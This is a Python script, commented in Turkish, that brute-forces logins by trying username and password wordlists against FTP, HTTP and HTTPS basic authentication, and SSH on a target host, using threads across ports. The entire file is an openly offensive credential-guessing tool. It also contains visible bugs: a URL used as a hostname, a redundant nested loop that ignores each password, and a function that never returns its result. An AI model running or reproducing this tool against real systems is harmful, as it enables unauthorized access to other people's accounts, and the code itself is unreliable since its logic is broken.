import ftplib
import socket
import requests
import paramiko
import threading
from queue import Queue

# Hedef IP, kullanıcı adı ve parola dosya yollarını buradan alıyoruz
target_ip = "https://example.com/"  # Hedef  
id_path = "/usr/share/wordlists/id"  # Kullanıcı adı dosyasının yolu
sifre_path = "/usr/share/wordlists/pass"  # Parola dosyasının yolu

# FTP brute force fonksiyonu
def ftp_brute_force(target, user, password):
    try:
        print(f"Deniyor - Kullanıcı: {user}, Parola: {password}")
        ftp = ftplib.FTP(target, timeout=5)
        ftp.login(user, password)
        print(f"Başarıyla giriş yapıldı! Kullanıcı: {user}, Parola: {password}")
        ftp.quit()
        return password
    except ftplib.all_errors as e:
        return None

# HTTP basic authentication brute force fonksiyonu
def http_brute_force(target, user, password):
    try:
        print(f"Deniyor - Kullanıcı: {user}, Parola: {password}")
        response = requests.get(f"http://{target}/", auth=(user, password), timeout=5)
        if response.status_code == 200:
            print(f"Başarıyla giriş yapıldı! Kullanıcı: {user}, Parola: {password}")
            return password
        else:
            return None
    except requests.exceptions.RequestException as e:
        return None

# HTTPS basic authentication brute force fonksiyonu
def https_brute_force(target, user, password):
    try:
        print(f"Deniyor - Kullanıcı: {user}, Parola: {password}")
        response = requests.get(f"https://{target}/", auth=(user, password), timeout=5)
        if response.status_code == 200:
            print(f"Başarıyla giriş yapıldı! Kullanıcı: {user}, Parola: {password}")
            return password
        else:
            return None
    except requests.exceptions.RequestException as e:
        return None

# SSH brute force fonksiyonu
def ssh_brute_force(target, user, password):
    try:
        print(f"Deniyor - Kullanıcı: {user}, Parola: {password}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=user, password=password, timeout=5)
        print(f"Başarıyla giriş yapıldı! Kullanıcı: {user}, Parola: {password}")
        ssh.close()
        return password
    except paramiko.AuthenticationException as e:
        return None
    except Exception as e:
        return None

# Çoklu hedefler ve portlar için brute force işlemi
def brute_force(target, user, wordlist_file, port):
    with open(wordlist_file, 'r') as file:
        for password in file:
            password = password.strip()
            if port == 21:  # FTP
                result = ftp_brute_force(target, user, password)
            elif port == 80:  # HTTP
                result = http_brute_force(target, user, password)
            elif port == 443:  # HTTPS
                result = https_brute_force(target, user, password)
            elif port == 22:  # SSH
                result = ssh_brute_force(target, user, password)
            else:
                print(f"Desteklenmeyen port: {port}")
                continue
            
            if result:
                print(f"Başarıyla giriş yapıldı: {result}")
                break

# Brute force işlemlerini paralel hale getiren yardımcı fonksiyon
def brute_force_thread(target, user, wordlist_file, port, queue):
    password = brute_force(target, user, wordlist_file, port)
    if password:
        queue.put(password)

# Çoklu hedefler üzerinde brute force işlemi yapma
def multi_target_brute_force(targets, user, wordlist_file, ports):
    queue = Queue()
    threads = []

    for target in targets:
        for port in ports:
            thread = threading.Thread(target=brute_force_thread, args=(target, user, wordlist_file, port, queue))
            thread.start()
            threads.append(thread)
    
    for thread in threads:
        thread.join()

    if not queue.empty():
        print(f"Başarıyla bulunan parola: {queue.get()}")
    else:
        print("Hiçbir parola bulunamadı!")

# Çalıştırma işlemi
if __name__ == "__main__":
    # Kullanıcı adı ve parola dosyasını okuma
    with open(id_path, 'r') as id_file:
        users = id_file.readlines()
    with open(sifre_path, 'r') as sifre_file:
        passwords = sifre_file.readlines()

    # Hedefler listesi (birden fazla hedef olabilir)
    targets = [target_ip]

    # Kullanıcı adı ve parola kombinasyonları ile brute force işlemi başlat
    for user in users:
        user = user.strip()  # Kullanıcıyı temizle
        for password in passwords:
            password = password.strip()  # Parolayı temizle
            print(f"Kullanıcı: {user}, Parola: {password}")
            # FTP, HTTP, HTTPS ve SSH portları için brute force işlemi başlat
            multi_target_brute_force(targets, user, sifre_path, [21, 80, 443, 22])
